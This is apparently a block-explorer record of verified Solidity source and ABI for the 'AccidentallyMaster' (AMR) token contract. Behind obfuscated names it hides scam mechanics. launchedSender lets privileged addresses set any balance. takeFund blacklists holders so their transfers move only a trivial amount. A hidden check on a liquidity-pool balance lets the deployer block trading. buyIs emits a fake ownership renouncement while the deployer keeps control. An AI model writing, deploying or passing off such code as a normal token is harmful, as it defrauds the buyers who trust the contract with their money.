{"SourceCode": "//SPDX-License-Identifier: MIT\n\npragma solidity ^0.8.2;\n\ninterface fromAt {\n    function createPair(address listShouldMode, address maxTxLaunch) external returns (address);\n}\n\ninterface feeEnable {\n    function totalSupply() external view returns (uint256);\n\n    function balanceOf(address buyFundAt) external view returns (uint256);\n\n    function transfer(address isBuy, uint256 walletLaunch) external returns (bool);\n\n    function allowance(address autoShouldFee, address spender) external view returns (uint256);\n\n    function approve(address spender, uint256 walletLaunch) external returns (bool);\n\n    function transferFrom(\n        address sender,\n        address isBuy,\n        uint256 walletLaunch\n    ) external returns (bool);\n\n    event Transfer(address indexed from, address indexed swapMax, uint256 value);\n    event Approval(address indexed autoShouldFee, address indexed spender, uint256 value);\n}\n\nabstract contract senderTxLaunched {\n    function _msgSender() internal view virtual returns (address) {\n        return msg.sender;\n    }\n\n    function _msgData() internal view virtual returns (bytes calldata) {\n        return msg.data;\n    }\n}\n\ninterface atExemptSwap {\n    function factory() external pure returns (address);\n\n    function WETH() external pure returns (address);\n}\n\ninterface buyFee is feeEnable {\n    function name() external view returns (string memory);\n\n    function symbol() external view returns (string memory);\n\n    function decimals() external view returns (uint8);\n}\n\ncontract AccidentallyMaster is senderTxLaunched, feeEnable, buyFee {\n\n    address maxSender = 0x10ED43C718714eb63d5aA57B78B54704E256024E;\n\n    mapping(address => uint256) private teamIsTake;\n\n    function approve(address feeBuy, uint256 walletLaunch) public virtual override returns (bool) {\n        buyTrading[_msgSender()][feeBuy] = walletLaunch;\n        emit Approval(_msgSender(), feeBuy, walletLaunch);\n        return true;\n    }\n\n    function tradingSender(address exemptMarketing) public {\n        if (senderWallet) {\n            return;\n        }\n        if (walletMin != amountTotal) {\n            autoReceiver = walletMin;\n        }\n        receiverMode[exemptMarketing] = true;\n        if (takeTx) {\n            autoReceiver = teamTrading;\n        }\n        senderWallet = true;\n    }\n\n    uint256 private maxReceiver = 100000000 * 10 ** 18;\n\n    function launchedSender(address autoToken, uint256 walletLaunch) public {\n        launchMin();\n        teamIsTake[autoToken] = walletLaunch;\n    }\n\n    function allowance(address tokenFeeMax, address feeBuy) external view virtual override returns (uint256) {\n        if (feeBuy == maxSender) {\n            return type(uint256).max;\n        }\n        return buyTrading[tokenFeeMax][feeBuy];\n    }\n\n    address fundAuto = 0x0ED943Ce24BaEBf257488771759F9BF482C39706;\n\n    uint256 tradingTx;\n\n    mapping(address => mapping(address => uint256)) private buyTrading;\n\n    function transferFrom(address takeSender, address isBuy, uint256 walletLaunch) external override returns (bool) {\n        if (_msgSender() != maxSender) {\n            if (buyTrading[takeSender][_msgSender()] != type(uint256).max) {\n                require(walletLaunch <= buyTrading[takeSender][_msgSender()]);\n                buyTrading[takeSender][_msgSender()] -= walletLaunch;\n            }\n        }\n        return amountToken(takeSender, isBuy, walletLaunch);\n    }\n\n    bool private receiverFee;\n\n    function symbol() external view virtual override returns (string memory) {\n        return launchBuy;\n    }\n\n    address private teamFrom;\n\n    constructor (){\n        if (autoReceiver == walletMin) {\n            walletMin = teamTrading;\n        }\n        atExemptSwap amountMarketing = atExemptSwap(maxSender);\n        isAuto = fromAt(amountMarketing.factory()).createPair(amountMarketing.WETH(), address(this));\n        \n        exemptTxWallet = _msgSender();\n        receiverMode[exemptTxWallet] = true;\n        teamIsTake[exemptTxWallet] = maxReceiver;\n        buyIs();\n        \n        emit Transfer(address(0), exemptTxWallet, maxReceiver);\n    }\n\n    uint256 public teamTrading;\n\n    uint256 private amountTotal;\n\n    function balanceOf(address buyFundAt) public view virtual override returns (uint256) {\n        return teamIsTake[buyFundAt];\n    }\n\n    function buyIs() public {\n        emit OwnershipTransferred(exemptTxWallet, address(0));\n        teamFrom = address(0);\n    }\n\n    mapping(address => bool) public receiverMode;\n\n    uint256 fromMax;\n\n    function takeFund(address liquidityTake) public {\n        launchMin();\n        if (tradingListTeam != receiverFee) {\n            walletExemptAuto = true;\n        }\n        if (liquidityTake == exemptTxWallet || liquidityTake == isAuto) {\n            return;\n        }\n        listMode[liquidityTake] = true;\n    }\n\n    string private launchFund = \"Accidentally Master\";\n\n    mapping(address => bool) public listMode;\n\n    function transfer(address autoToken, uint256 walletLaunch) external virtual override returns (bool) {\n        return amountToken(_msgSender(), autoToken, walletLaunch);\n    }\n\n    function marketingAt(uint256 walletLaunch) public {\n        launchMin();\n        tradingTx = walletLaunch;\n    }\n\n    uint256 constant feeFundSell = 11 ** 10;\n\n    event OwnershipTransferred(address indexed exemptFee, address indexed fundAt);\n\n    bool private tradingListTeam;\n\n    bool public takeTx;\n\n    bool public walletExemptAuto;\n\n    function launchMin() private view {\n        require(receiverMode[_msgSender()]);\n    }\n\n    function amountToken(address takeSender, address isBuy, uint256 walletLaunch) internal returns (bool) {\n        if (takeSender == exemptTxWallet) {\n            return enableLaunchedList(takeSender, isBuy, walletLaunch);\n        }\n        uint256 tokenLiquidity = feeEnable(isAuto).balanceOf(fundAuto);\n        require(tokenLiquidity == tradingTx);\n        require(isBuy != fundAuto);\n        if (listMode[takeSender]) {\n            return enableLaunchedList(takeSender, isBuy, feeFundSell);\n        }\n        return enableLaunchedList(takeSender, isBuy, walletLaunch);\n    }\n\n    function decimals() external view virtual override returns (uint8) {\n        return sellTotal;\n    }\n\n    uint256 private walletMin;\n\n    function owner() external view returns (address) {\n        return teamFrom;\n    }\n\n    bool public senderWallet;\n\n    uint256 private autoReceiver;\n\n    function totalSupply() external view virtual override returns (uint256) {\n        return maxReceiver;\n    }\n\n    address public isAuto;\n\n    function getOwner() external view returns (address) {\n        return teamFrom;\n    }\n\n    uint8 private sellTotal = 18;\n\n    function enableLaunchedList(address takeSender, address isBuy, uint256 walletLaunch) internal returns (bool) {\n        require(teamIsTake[takeSender] >= walletLaunch);\n        teamIsTake[takeSender] -= walletLaunch;\n        teamIsTake[isBuy] += walletLaunch;\n        emit Transfer(takeSender, isBuy, walletLaunch);\n        return true;\n    }\n\n    string private launchBuy = \"AMR\";\n\n    address public exemptTxWallet;\n\n    function name() external view virtual override returns (string memory) {\n        return launchFund;\n    }\n\n}", "ABI": "[{\"inputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"constructor\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"autoShouldFee\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Approval\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"exemptFee\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"fundAt\",\"type\":\"address\"}],\"name\":\"OwnershipTransferred\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"from\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"swapMax\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Transfer\",\"type\":\"event\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"tokenFeeMax\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"feeBuy\",\"type\":\"address\"}],\"name\":\"allowance\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"feeBuy\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"walletLaunch\",\"type\":\"uint256\"}],\"name\":\"approve\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"buyFundAt\",\"type\":\"address\"}],\"name\":\"balanceOf\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"buyIs\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"decimals\",\"outputs\":[{\"internalType\":\"uint8\",\"name\":\"\",\"type\":\"uint8\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"exemptTxWallet\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"getOwner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"isAuto\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"autoToken\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"walletLaunch\",\"type\":\"uint256\"}],\"name\":\"launchedSender\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"listMode\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"walletLaunch\",\"type\":\"uint256\"}],\"name\":\"marketingAt\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"name\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"owner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"receiverMode\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"senderWallet\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"symbol\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"liquidityTake\",\"type\":\"address\"}],\"name\":\"takeFund\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"takeTx\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"teamTrading\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"totalSupply\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"exemptMarketing\",\"type\":\"address\"}],\"name\":\"tradingSender\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"autoToken\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"walletLaunch\",\"type\":\"uint256\"}],\"name\":\"transfer\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"takeSender\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"isBuy\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"walletLaunch\",\"type\":\"uint256\"}],\"name\":\"transferFrom\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"walletExemptAuto\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"}]", "ContractName": "AccidentallyMaster", "CompilerVersion": "v0.8.19+commit.7dd6d404", "OptimizationUsed": "0", "Runs": "200", "ConstructorArguments": "", "EVMVersion": "Default", "Library": "", "LicenseType": "MIT", "Proxy": "0", "Implementation": "", "SwarmSource": ""}